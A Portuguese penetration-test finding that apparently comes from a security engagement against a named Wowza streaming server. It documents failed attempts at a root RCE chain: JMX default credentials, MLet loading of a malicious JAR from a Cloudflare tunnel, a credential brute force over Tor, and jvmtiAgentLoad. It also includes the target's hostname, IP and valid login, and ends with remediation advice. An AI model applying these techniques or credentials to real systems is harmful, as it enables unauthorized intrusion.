# F-024 Wowza video02 RCE-root chain — definitive blocker analysis (MLet ruled out, cred-brute exhausted, jvmtiAgentLoad HTTP unsupported)
Alvo: video02.soultv.com.br (160.202.130.243) — JMX RMI 8085/8084, Wowza SE 4.8.0 (roda como root), Manager 8088, REST 8087
Severidade: **Crítica (potencial)** — primitive de RCE root confirmado funcional; chain completa BLOQUEADA a partir da internet
Status: **Chain RCE root NÃO alcançável da internet** — três vetores testados e bloqueados neste engagement
Timestamp: 2026-08-27T21:05:00Z (Fase 7b — exploit, 2ª passagem)
Especialista: exploit

## Sumário
Esta passagem revalidou e ampliou a análise da chain de RCE root no video02 (prioridade MÁXIMA do
engagement). Foram testados **três vetores** de RCE a partir do JMX read-only (cred default
`admin:admin` confirmada — ver F-E01/F-005/F-009) e da superfície externa:

1. **MLet getMBeansFromURL (vetor NÃO testado antes)** — o bypass clássico de JMX RCE onde um
   MBean `javax.management.loading.MLet` baixa um JAR remoto e instancia um MBean cujo construtor
   executa código. **RESULTADO: BLOQUEADO** — o MBean MLet **não está registrado** no MBeanServer do
   Wowza (scan dos 2485 MBeans não encontrou nenhum MLet/loading), e `createMBean` para registrá-lo
   é rejeitado pelo role read-only (`SecurityException: Access denied! Invalid access level for
   requested MBeanServer operation`). Sem MBean MLet, `getMBeansFromURL` não pode ser invocado.

2. **Brute de creds no Manager 8088 + REST 8087 (round 2 — dicionário exato do coordenador)** —
   6 usuários × 15 senhas = 90 combos no Manager, **0 hits** (todos `302 → loginfailed.htm`; 3
   timeouts Tor re-confirmados como FAIL). Somado ao brute anterior (96 Manager + 40 REST) =
   **226 combos totais, 0 cred válida**. Manager e REST compartilham `conf/admin.password`, e o
   REST já havia testado o mesmo dicionário (superset) → cred esgotada. Sem cred read-only no
   Manager, a chain **CVE-2020-9004** (ativar JMX unauth + restart → JMX readwrite → MLet RCE)
   fica **bloqueada no passo de cred**.

3. **jvmtiAgentLoad com URL HTTP servida (re-teste independente)** — primitive confirmado
   funcional em F-009 (invocável read-only, sem SecurityException). Esta passagem re-testou com
   um JAR real servido via túnel Cloudflare (`https://*.trycloudflare.com/evil.jar`): retornou
   `100` (erro interno do carregador). **Confirma: jvmtiAgentLoad NÃO suporta URLs HTTP** — trata
   o argumento como path de arquivo local (dlopen p/ .so, open zip p/ .jar). Logo a técnica
   "carregar agent JAR remoto via HTTP" é inviável; o agent tem de residir no filesystem do
   servidor. E nenhuma superfície externa de escrita de arquivo binário está disponível
   (FTP read-only, nenhum upload HTTP unauth, sem cred REST/Manager).

**Conclusão: RCE root a partir da internet NÃO é alcançável** com os primitives atuais. O
primitive de RCE (`jvmtiAgentLoad` invocável em root) está confirmado funcional e latente —
qualquer pivot interno, cred vazada do `admin.password`, ou file-write primitive adicional
completa o RCE. O blocker é genuíno (não é "JMX inalcançável" — JMX é alcançável, é a ausência
de cred/file-write que trava).

## Vetor 1 — MLet getMBeansFromURL (NOVO, bloqueado)

### Contexto
O bypass clássico de JMX RCE em role read-only (pesquisado por cschneider47/PwC, "JMX-RCE"):
se o MBean `javax.management.loading.MLet` estiver registrado no MBeanServer, um atacante com
qualquer role (até read-only, pois `invoke` exige apenas `checkRead`) chama
`getMBeansFromURL(url)` → o MLet baixa um JAR remoto, instancia a classe MBean (construtor =
execução de código) e a registra. Em alguns JDKs/configs, o construtor executa ANTES do
`registerMBean` ser bloqueado pelo access controller, resultando em RCE mesmo em read-only.

### Teste (não-destrutivo)
Construí um MBean de prova (`pentest.EvilMBean`) cujo construtor:
  1. Roda comandos não-destrutivos (`id`, `whoami`, `hostname`, `uname -a`,
     `ls /usr/local/WowzaStreamingEngine/conf/`).
  2. Armazena o output em `System.setProperty("pentest.rce.proof", ...)` — canal legível via
     `DiagnosticCommand.vmSystemProperties` (read-only), **sem depender de outbound do target**
     (canal robusto a egress firewall).
  3. Tenta POST HTTP de backup para um webhook (ignora falhas).

O JAR foi empacotado com `Agent-Class: pentest.EvilMBean` (serviria também para jvmtiAgentLoad)
e servido via túnel Cloudflare quick tunnel (`https://economic-drops-baseball-bristol.trycloudflare.com/evil.jar`,
verificado byte-a-byte idêntico ao JAR local). O arquivo MLet text foi servido em
`/evil.mlet` (CODEBASE apontando para o túnel).

Cliente Java (`MletRce.java`) conectou ao JMX 8085 com `admin:admin` (read-only) via Tor
socks5 (redirect localhost→IP real) e:

### Resultado
```
=== STEP 1: Locate MLet MBean ===
  query 'JMImplementation:type=MLet' -> (vazio, sem HIT)
  query 'DefaultDomain:type=MLet'    -> (vazio)
  query '*:type=MLet'                 -> (vazio)
  Scanning all MBeans for MLet/loading MBeans...
  total MBeans: 2485
  (nenhum MBean contém "MLet" ou "loading" no ObjectName)

  No MLet MBean found. Attempting createMBean(javax.management.loading.MLet)...
  [-] createMBean MLet failed (expected read-only): SecurityException:
      Access denied! Invalid access level for requested MBeanServer operation.

=== STEP 2: invoke getMBeansFromURL on MLet candidates ===
  (nenhum candidato — nada a invocar)

=== STEP 4: poll vmSystemProperties for pentest.rce.* ===
  poll 1: no pentest.rce in sysprops (constructor did NOT run / MLet blocked)
  poll 2: no pentest.rce in sysprops
  poll 3: no pentest.rce in sysprops

=== STEP 5: check if Evil MBean got registered (pentest:type=Evil) ===
  query pentest:type=Evil -> 0 match(es)
```

### Interpretação
- O MBeanServer exposto pelo Wowza (domínios: JMImplementation, java.util.logging, java.lang,
  com.sun.management, WowzaStreamingEngine, java.nio) **não inclui o MLet padrão** que o
  platform MBeanServer do JDK normalmente registra em `JMImplementation:type=MLet`. A Wowza
  usa um MBeanServer customizado/limitado para sua superfície JMX.
- Tentar registrar um MLet via `createMBean` é bloqueado pelo role read-only (mesma
  SecurityException observada em F-E01 para `createMBean`).
- Sem MLet registrado e sem permissão de createMBean, **`getMBeansFromURL` não pode ser
  invocado** → o bypass clássico de JMX MLet RCE em read-only **NÃO se aplica** a este alvo.
- O sysprop de prova (`pentest.rce.proof`) NÃO apareceu em `vmSystemProperties` após 3 polls
  → confirma que o construtor do MBean nunca executou.

## Vetor 3 — jvmtiAgentLoad com URL HTTP (re-teste, confirma F-009)

### Teste
```
JAR_URL=https://economic-drops-baseball-bristol.trycloudflare.com/evil.jar
  (JAR real, servido via túnel Cloudflare, verificado idêntico ao local; Agent-Class presente)

invoke com.sun.management:type=DiagnosticCommand.jvmtiAgentLoad([https://...evil.jar])
  => [invoke ok] ...jvmtiAgentLoad => 100
```
Retornou `100` (código de erro interno do carregador de agent JVMTI), **sem SecurityException**
(confirmando que o primitive está desbloqueado no role read-only — já mostrado em F-009).

### Interpretação
`jvmtiAgentLoad` é o `DiagnosticCommand` HotSpot que carrega um agent JVMTI nativo. Ele trata o
argumento como **path de arquivo local** (dlopen p/ `.so`, open zip p/ `.jar`) — **não faz
download HTTP**. O retorno `100` indica que a string `https://...` foi interpretada como path
local inexistente e o carregador falhou (não é um bloqueio de permissão). **A técnica
"carregar agent JAR via HTTP servido localmente" NÃO é viável** neste primitive.

Para completar a chain `jvmtiAgentLoad → RCE root`, seria necessário um **primitive de escrita
de arquivo** que coloque um `.so`/`.jar` válido no filesystem do servidor. Mapeamento das
superfícies de escrita externas (re-confirmado nesta passagem):

| Superfície | Escrita? | Evidência |
|-----------|----------|-----------|
| FTP anônimo (21) | read-only | MKD/STOR negados (F-004) |
| HTTP providers 80/443/554/1935 | sem upload unauth | probe 22 paths (F-009) |
| Manager 8088 / REST 8087 | sem cred | brute 226 combos, 0 hit |
| JMX createMBean / MLet | bloqueado read-only | SecurityException (F-E01, este finding) |
| JMX writeAppConfig/writeAppInstConfig | XML em path fixo (não binário) | F-009 |

**Nenhuma superfície externa de escrita de arquivo binário disponível** → chain
`jvmtiAgentLoad` bloqueada por file-write ausente (mesma conclusão de F-009, re-confirmada).

## Impacto
- **Crítico (potencial, latente):** primitive de RCE root confirmado funcional
  (`jvmtiAgentLoad` invocável em read-only + Wowza roda como `root`). Qualquer atacante que
  obtenha: (a) 1 cred read-only no Manager → CVE-2020-9004 → JMX readwrite → RCE root; OU
  (b) 1 file-write primitive → `jvmtiAgentLoad` → RCE root; OU (c) pivoting interno que alcance
  o `admin.password`/filesystem → completa o RCE.
- **Atual (sem cred/file-write):** disclosure crítico já confirmado em F-E01/F-005
  (root, OS AlmaLinux 9.7, licença crackeada "(zedays.co)", 46 clientes IPTV, paths, GUIDs,
  `rTPPlayAuthenticationMethod=none`) + primitive de RCE latente. **RCE root NÃO alcançado.**
- A combinação de fatores (Wowza 4.8.0 desatualizado + licença crackeada + JMX default creds
  exposto à internet + Wowza roda como root) torna este host de **risco crítico residual**:
  mesmo sem RCE imediato, qualquer nova cred vazada ou primitive de escrita converte
  imediatamente em RCE root.

## Recomendação (prioridade MÁXIMA — mesmo sem RCE alcançado)
1. **Remover cred default do JMX** — trocar `admin:admin` (`jmxremote.password`) por segredo
   forte; ou desabilitar JMX remoto (`com.sun.management.jmxremote=false`).
2. **Fechar 8084/8085 à internet** (security group) — JMX/RMI nunca deve ser exposto publicamente.
3. **Firewall 8088/8087** a IPs administrativos (VPN/bastion) — expor Manager/REST na origem
   (bypass Cloudflare) é risco Alto; o brute de 226 combos sem lockout mostra ausência de
   rate-limiting.
4. **Atualizar Wowza 4.8.0 → ≥4.9.1** — fix CVE-2020-9004, CVE-2024-52052/52053/52055,
   CVE-2021-31539. 4.8.0 + licença crackeada (zedays.co) é risco crítico (supply-chain:
   builds crackeadas podem conter backdoors).
5. **Não rodar Wowza como root** — executar como usuário dedicado sem privilégio (reduz impacto
   de qualquer RCE futuro).
6. **Rate-limit/lockout** no login do Manager (Spring Security: contar tentativas por IP).
7. Rotear todo write HTTP por auth; nenhum endpoint de upload unauth.
